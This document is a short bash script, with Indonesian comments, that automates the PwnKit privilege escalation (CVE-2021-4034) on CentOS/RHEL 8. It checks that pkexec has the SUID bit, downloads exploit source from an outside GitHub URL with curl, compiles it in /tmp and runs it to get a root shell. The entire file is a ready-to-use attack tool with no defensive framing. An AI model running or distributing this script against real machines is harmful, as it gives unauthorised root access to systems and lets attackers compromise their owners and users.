#!/bin/bash

# -- PwnKit Auto Escalation Script --
# Untuk CentOS/RHEL 8, pkexec SUID

echo "[*] Checking pkexec SUID..."
PKEXEC=$(which pkexec 2>/dev/null)
if [[ ! -x "$PKEXEC" ]]; then
  echo "[!] pkexec not found or not executable."
  exit 1
fi
if [[ ! -u "$PKEXEC" ]]; then
  echo "[!] pkexec not SUID. Not vulnerable."
  exit 1
fi

echo "[*] Cleaning old exploit files..."
rm -f /tmp/sh /tmp/gconv /tmp/gconv-modules /tmp/pwnkit* 2>/dev/null

echo "[*] Downloading PwnKit (CVE-2021-4034) exploit..."
curl -sL https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o /tmp/pwnkit.c
if [[ ! -f /tmp/pwnkit.c ]]; then
  echo "[!] Gagal download exploit!"
  exit 1
fi

echo "[*] Compiling exploit..."
gcc /tmp/pwnkit.c -o /tmp/pwnkit_exploit 2>/dev/null
if [[ ! -x /tmp/pwnkit_exploit ]]; then
  echo "[!] Gagal compile exploit! (GCC tidak ada?)"
  exit 1
fi

echo "[*] Menjalankan exploit (root shell jika berhasil)..."
cd /tmp
chmod +x /tmp/pwnkit_exploit
./pwnkit_exploit

echo "[*] Selesai. Jika prompt tidak root, exploit gagal (sudah di patch atau error lain)."
